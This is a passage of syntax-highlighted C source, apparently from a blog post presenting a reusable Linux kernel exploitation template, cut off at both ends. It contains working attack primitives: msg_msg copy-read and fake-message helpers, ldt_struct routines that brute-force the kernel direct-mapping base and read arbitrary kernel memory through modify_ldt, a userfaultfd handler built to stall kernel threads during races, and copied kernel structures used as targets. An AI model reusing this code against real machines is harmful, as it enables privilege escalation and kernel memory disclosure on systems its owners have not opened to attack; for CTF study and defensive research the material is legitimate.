msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, </span><br><span class="line">                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_msg</span><span class="params">(struct msg_msg *msg, <span class="keyword">uint64_t</span> m_list_next, <span class="keyword">uint64_t</span> m_list_prev, </span></span></span><br><span class="line"><span class="params"><span class="function">              <span class="keyword">uint64_t</span> m_type, <span class="keyword">uint64_t</span> m_ts,  <span class="keyword">uint64_t</span> next, <span class="keyword">uint64_t</span> security)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * VII - ldt_struct related</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Somethings we may want to compile the exp binary with MUSL-GCC, which</span></span><br><span class="line"><span class="comment"> * doesn&#x27;t contain the `asm/ldt.h` file.</span></span><br><span class="line"><span class="comment"> * As the file is small, I copy that directly to here :)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDT_ENTRIES	8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDT_ENTRY_SIZE	8</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __ASSEMBLY__</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS</span></span><br><span class="line"><span class="comment"> * not to the default values if you still want to do syscalls. This</span></span><br><span class="line"><span class="comment"> * call is more for 32bit mode therefore.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  entry_number;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  base_addr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  limit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __x86_64__</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment">	 * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment">	 * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment">	 * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment">	 * actual value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODIFY_LDT_CONTENTS_DATA	0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODIFY_LDT_CONTENTS_STACK	1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODIFY_LDT_CONTENTS_CODE	2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !__ASSEMBLY__ */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* this should be referred to your kernel */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_STARTUP_64 0xffffffff81000060</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* desc initializer */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">init_desc</span><span class="params">(struct user_desc *desc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* init descriptor info */</span></span><br><span class="line">    desc-&gt;base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc-&gt;entry_number = <span class="number">0x8000</span> / <span class="number">8</span>;</span><br><span class="line">    desc-&gt;limit = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;contents = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;lm = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc-&gt;useable = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief burte-force hitting page_offset_base by modifying ldt_struct</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param ldt_cracker function to make the ldt_struct modifiable</span></span><br><span class="line"><span class="comment"> * @param cracker_args args of ldt_cracker</span></span><br><span class="line"><span class="comment"> * @param ldt_momdifier function to modify the ldt_struct-&gt;entries</span></span><br><span class="line"><span class="comment"> * @param momdifier_args args of ldt_momdifier</span></span><br><span class="line"><span class="comment"> * @param burte_size size of each burte-force hitting</span></span><br><span class="line"><span class="comment"> * @return size_t address of page_offset_base</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">ldt_guessing_direct_mapping_area</span><span class="params">(<span class="keyword">void</span> *(*ldt_cracker)(<span class="keyword">void</span>*),</span></span></span><br><span class="line"><span class="params"><span class="function">                                        <span class="keyword">void</span> *cracker_args,</span></span></span><br><span class="line"><span class="params"><span class="function">                                        <span class="keyword">void</span> *(*ldt_momdifier)(<span class="keyword">void</span>*, <span class="keyword">size_t</span>), </span></span></span><br><span class="line"><span class="params"><span class="function">                                        <span class="keyword">void</span> *momdifier_args,</span></span></span><br><span class="line"><span class="params"><span class="function">                                        <span class="keyword">uint64_t</span> burte_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line">	<span class="keyword">uint64_t</span> temp;</span><br><span class="line">	<span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init descriptor info */</span></span><br><span class="line">    init_desc(&amp;desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make the ldt_struct modifiable */</span></span><br><span class="line">    ldt_cracker(cracker_args);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* leak kernel direct mapping area by modify_ldt() */</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        ldt_momdifier(momdifier_args, page_offset_base);</span><br><span class="line">        retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (retval &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (retval == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] no mm-&gt;context.ldt!&quot;</span>);</span><br><span class="line">            page_offset_base = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        page_offset_base += burte_size;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> page_offset_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief read the contents from a specific kernel memory.</span></span><br><span class="line"><span class="comment"> * Note that we should call ldtGuessingDirectMappingArea() firstly,</span></span><br><span class="line"><span class="comment"> * and the function should be used in that caller process</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param ldt_momdifier function to modify the ldt_struct-&gt;entries</span></span><br><span class="line"><span class="comment"> * @param momdifier_args args of ldt_momdifier</span></span><br><span class="line"><span class="comment"> * @param addr address of kernel memory to read</span></span><br><span class="line"><span class="comment"> * @param res_buf buf to be written the data from kernel memory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ldt_arbitrary_read</span><span class="params">(<span class="keyword">void</span> *(*ldt_momdifier)(<span class="keyword">void</span>*, <span class="keyword">size_t</span>), </span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">void</span> *momdifier_args, <span class="keyword">size_t</span> addr, <span class="keyword">char</span> *res_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">0x8000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> temp;</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init descriptor info */</span></span><br><span class="line">    init_desc(&amp;desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* modify the ldt_struct-&gt;entries to addr */</span></span><br><span class="line">    ldt_momdifier(momdifier_args, addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read data by the child process */</span></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        <span class="comment">/* child */</span></span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], buf, <span class="number">0x8000</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* parent */</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], res_buf, <span class="number">0x8000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief seek specific content in the memory.</span></span><br><span class="line"><span class="comment"> * Note that we should call ldtGuessingDirectMappingArea() firstly,</span></span><br><span class="line"><span class="comment"> * and the function should be used in that caller process</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param ldt_momdifier function to modify the ldt_struct-&gt;entries</span></span><br><span class="line"><span class="comment"> * @param momdifier_args args of ldt_momdifier</span></span><br><span class="line"><span class="comment"> * @param page_offset_base the page_offset_base we leakked before</span></span><br><span class="line"><span class="comment"> * @param mem_finder your own function to search on a 0x8000-bytes buf.</span></span><br><span class="line"><span class="comment"> *          It should be like `size_t func(void *args, char *buf)` and the `buf`</span></span><br><span class="line"><span class="comment"> *          is where we store the data from kernel in ldt_seeking_memory().</span></span><br><span class="line"><span class="comment"> *          The return val should be the offset of the `buf`, `-1` for failure</span></span><br><span class="line"><span class="comment"> * @param finder_args your own function&#x27;s args</span></span><br><span class="line"><span class="comment"> * @return size_t kernel addr of content to find, -1 for failure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">ldt_seeking_memory</span><span class="params">(<span class="keyword">void</span> *(*ldt_momdifier)(<span class="keyword">void</span>*, <span class="keyword">size_t</span>), </span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">void</span> *momdifier_args, <span class="keyword">uint64_t</span> page_offset_base,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">size_t</span> (*mem_finder)(<span class="keyword">void</span>*, <span class="keyword">char</span> *), <span class="keyword">void</span> *finder_args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">0x8000</span>];</span><br><span class="line">    <span class="keyword">size_t</span> search_addr, result_addr = <span class="number">-1</span>, offset;</span><br><span class="line"></span><br><span class="line">    search_addr = page_offset_base;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        ldt_arbitrary_read(ldt_momdifier, momdifier_args, search_addr, buf);</span><br><span class="line"></span><br><span class="line">        offset = mem_finder(finder_args, buf);</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            result_addr = search_addr + offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * VIII - userfaultfd related code</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The MUSL also doesn&#x27;t contain `userfaultfd.h` :( </span></span><br><span class="line"><span class="comment"> * Luckily we just need a bit of micros in exploitation, </span></span><br><span class="line"><span class="comment"> * so just define them directly is okay :)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFD_API ((uint64_t)0xAA)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _UFFDIO_REGISTER		(0x00)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _UFFDIO_COPY			(0x03)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _UFFDIO_API			(0x3F)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* userfaultfd ioctl ids */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO 0xAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_API		_IOWR(UFFDIO, _UFFDIO_API,	\</span></span><br><span class="line"><span class="meta">				      struct uffdio_api)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_REGISTER		_IOWR(UFFDIO, _UFFDIO_REGISTER, \</span></span><br><span class="line"><span class="meta">				      struct uffdio_register)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_COPY		_IOWR(UFFDIO, _UFFDIO_COPY,	\</span></span><br><span class="line"><span class="meta">				      struct uffdio_copy)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* read() structure */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> &#123;</span></span><br><span class="line">	<span class="keyword">uint8_t</span>	event;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span>	reserved1;</span><br><span class="line">	<span class="keyword">uint16_t</span>	reserved2;</span><br><span class="line">	<span class="keyword">uint32_t</span>	reserved3;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">uint64_t</span>	flags;</span><br><span class="line">			<span class="keyword">uint64_t</span>	address;</span><br><span class="line">			<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">				<span class="keyword">uint32_t</span> ptid;</span><br><span class="line">			&#125; feat;</span><br><span class="line">		&#125; pagefault;</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">uint32_t</span>	ufd;</span><br><span class="line">		&#125; fork;</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">uint64_t</span>	from;</span><br><span class="line">			<span class="keyword">uint64_t</span>	to;</span><br><span class="line">			<span class="keyword">uint64_t</span>	len;</span><br><span class="line">		&#125; remap;</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="keyword">uint64_t</span>	start;</span><br><span class="line">			<span class="keyword">uint64_t</span>	end;</span><br><span class="line">		&#125; remove;</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="comment">/* unused reserved fields */</span></span><br><span class="line">			<span class="keyword">uint64_t</span>	reserved1;</span><br><span class="line">			<span class="keyword">uint64_t</span>	reserved2;</span><br><span class="line">			<span class="keyword">uint64_t</span>	reserved3;</span><br><span class="line">		&#125; reserved;</span><br><span class="line">	&#125; arg;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFD_EVENT_PAGEFAULT	0x12</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> api;</span><br><span class="line">    <span class="keyword">uint64_t</span> features;</span><br><span class="line">    <span class="keyword">uint64_t</span> ioctls;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_range</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> start;</span><br><span class="line">    <span class="keyword">uint64_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uffdio_range</span> <span class="title">range</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_REGISTER_MODE_MISSING	((uint64_t)1&lt;&lt;0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_REGISTER_MODE_WP		((uint64_t)1&lt;&lt;1)</span></span><br><span class="line">    <span class="keyword">uint64_t</span> mode;</span><br><span class="line">    <span class="keyword">uint64_t</span> ioctls;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> &#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> dst;</span><br><span class="line">	<span class="keyword">uint64_t</span> src;</span><br><span class="line">	<span class="keyword">uint64_t</span> len;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UFFDIO_COPY_MODE_DONTWAKE		((uint64_t)1&lt;&lt;0)</span></span><br><span class="line">	<span class="keyword">uint64_t</span> mode;</span><br><span class="line">	<span class="keyword">int64_t</span> copy;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//#include &lt;linux/userfaultfd.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> temp_page_for_stuck[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfaultfd</span><span class="params">(<span class="keyword">pthread_t</span> *monitor_thread, <span class="keyword">void</span> *addr,</span></span></span><br><span class="line"><span class="params"><span class="function">                          <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> *(*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s = pthread_create(monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">uffd_handler_for_stucking_thread</span><span class="params">(<span class="keyword">void</span> *args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) args;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* just stuck there is okay... */</span></span><br><span class="line">        sleep(<span class="number">100000000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) temp_page_for_stuck;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                                    ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfaultfd_for_thread_stucking</span><span class="params">(<span class="keyword">pthread_t</span> *monitor_thread, </span></span></span><br><span class="line"><span class="params"><span class="function">                                          <span class="keyword">void</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    register_userfaultfd(monitor_thread, buf, len, </span><br><span class="line">                         uffd_handler_for_stucking_thread);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IX - kernel structures </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">serial_icounter_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termiox</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> *buf;</span><br><span class="line">	<span class="keyword">size_t</span> size;</span><br><span class="line">	<span class="keyword">size_t</span> from;</span><br><span class="line">	<span class="keyword">size_t</span> count;</span><br><span class="line">	<span class="keyword">size_t</span> pad_until;</span><br><span class="line">	<span class="keyword">loff_t</span> index;</span><br><span class="line">	<span class="keyword">loff_t</span> read_pos;</span><br><span class="line">	<span class="keyword">uint64_t</span> lock[<span class="number">4</span>]; <span class="comment">//struct mutex lock;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span>;</span></span><br><span class="line">	<span class="keyword">int</span> poll_event;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *<span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">	<span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">	<span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">	<span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span 